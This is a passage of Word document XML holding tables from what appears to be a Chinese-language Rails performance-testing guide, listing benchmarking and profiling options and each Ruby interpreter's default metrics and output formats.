                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Mode</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="74D2D537" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7EA2644F" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>:runs</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="36EF2B5A" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Number of runs.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="105EF0E4" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Benchmarking: 4, Profiling: 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="254C2276" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Both</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="0DCC57D2" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="574AA2B4" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>:output</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6550B9D1" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Directory to use when writing the results.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="64F56C60" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>tmp/performance</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="364B9CD5" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Both</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="6FF82058" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7351CEDB" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>:metrics</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="247990E9" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Metrics to use.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="66B8FD1B" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>See below.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="61D2D311" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Both</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="03565F93" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1CFDC2C3" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>:formats</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E2570CE" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Formats to output to.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0D6570FF" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>See below.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="07AC982B" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Profiling</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="239D357D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>其中 metrics 和 formats 默认值决定于你的解释器。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0"/>
        <w:gridCol w:w="772"/>
        <w:gridCol w:w="3764"/>
        <w:gridCol w:w="3220"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="529034DC" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6119C0E5" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Interpreter</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3409EBC8" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Mode</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7BA72248" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Default metrics</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="55DB2110" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Default formats</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="721D5D8D" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vMerge w:val="restart"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0148B1CB" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
              </w:rPr>
              <w:t>MRI</w:t>
            </w:r>
            <w:r>
              <w:t>/</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
              </w:rPr>
              <w:t>REE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5CD9725D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Benchmarking</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D054DC7" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>[:wall_time, :memory, :objects, :gc_runs, :gc_time]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6F859120" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>N/A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="2244F0CA" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vMerge/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6B9ADDD6" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F3D3F13" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Profiling </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5BA977C5" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>[:process_time, :memory, :objects]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0F649F6E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>[:flat, :graph_html, :call_tree, :call_stack]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="3890E6C0" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vMerge w:val="restart"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="49D64734" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Rubinius</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3C767D38" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Benchmarking</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="28AE9354" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>[:wall_time, :memory, :objects, :gc_runs, :gc_time]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C56CA04" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>N/A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="012164A5" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vMerge/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="29F131C9" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="250FC449" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Profiling </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="68E9FD4F" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>[:wall_time]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="73A7A2E7" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>[:flat, :graph]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="56C1848F" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vMerge w:val="restart"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="791EB0A1" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">JRuby </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="296B1484" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Benchmarking</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0BFECCEB" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>[:wall_time, :user_time, :memory, :gc_runs, :gc_time]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4908195B" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>N/A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="0EEE69AB" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
